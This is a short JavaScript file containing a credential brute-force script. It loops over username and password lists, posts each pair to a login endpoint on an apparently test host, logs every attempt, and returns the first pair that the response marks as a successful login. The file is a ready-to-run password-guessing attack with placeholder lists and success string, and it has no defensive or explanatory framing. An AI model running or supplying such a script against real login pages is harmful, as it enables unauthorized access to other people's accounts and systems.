async function bruteForceLogin(usernames, passwords, delay = 1000) {
    const loginUrl = 'https://test.gsm.abs.com/login?flow=cd3c5202-c04a-4056-b4b8-bc6b0ea05587';

    for (const username of usernames) {
        for (const password of passwords) {
            try {
                const response = await fetch(loginUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({
                        identifier: username,
                        password: password
                    })
                });

                if (response.ok) {
                    const text = await response.text();
                    if (text.includes('successful login indicator')) { // Replace with actual success indicator
                        console.log(`Successful login with username: ${username} and password: ${password}`);
                        return { username, password };
                    }
                } else {
                    console.log(`Failed login attempt with username: ${username} and password: ${password}`);
                }
            } catch (error) {
                console.error(`Error during login attempt: ${error}`);
            }

            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }

    console.log('No successful login found.');
    return null;
}

// Example usage:
const usernames = ['user1', 'user2', 'user3']; // Replace with your list of usernames
const passwords = ['pass1', 'pass2', 'pass3']; // Replace with your list of passwords

bruteForceLogin(usernames, passwords, 1000);